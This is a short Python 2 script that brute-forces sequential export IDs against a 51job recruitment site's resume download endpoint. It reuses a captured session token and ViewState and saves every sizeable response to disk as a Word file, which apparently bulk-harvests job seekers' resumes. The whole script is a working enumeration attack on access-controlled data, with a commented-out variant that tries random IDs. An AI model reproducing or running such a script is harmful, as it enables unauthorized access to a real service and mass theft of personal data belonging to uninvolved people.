# coding=utf-8
import requests, random

url = 'http://cvs.ehire.51job.com/Download.aspx?num=0.6114649700083097&lang=&ctmid=1189&hruid=4976699&tokenid=fd6e3a99-5dde-40fb-bfc7-749be472&dbid=1&p=1&cf=&sg=3e52686820a414f2&f=BAK&fi=0&s=454656288&j=0&fa=Word'
params = {
    '__VIEWSTATE': '/wEPDwUKMTI5Njk0MTcwN2Rk/cPmwAX1+C2brBi5YmemvttV5eM=',
    '__VIEWSTATEGENERATOR': 'E0C68A58',
    'hidExportFolder': 'BAK',
    'hidExportFilter': '0',
    'hidExportJobID': '0',
    'hidExportFormat': 'Word',
    'hidExportPage': '1',
}
j = 111120200
while j < 999999999:
    params['hidExportSeqID'] = j
    word = requests.post(url, data=params)
    if len(word.text) > 2000:
        print 'hit one'
        path = 'C:\Users\Lenovo\Desktop\word\\' + str(params['hidExportSeqID']) + '.doc'
        with open(path, 'wb') as code:
            code.write(word.content)
    if j % 100 == 0:
        print j
    j += 1
# for i in range(1, 1000):
#     params['hidExportSeqID'] = random.randint(100000000, 999999999)
#     word = requests.post(url, data=params)
#     if len(word.text) > 2000:
#         print 'hit one'
#         path = 'C:\Users\Lenovo\Desktop\word\\' + str(params['hidExportSeqID']) + '.doc'
#         with open(path, 'wb') as code:
#             code.write(word.content)
#     print params['hidExportSeqID']
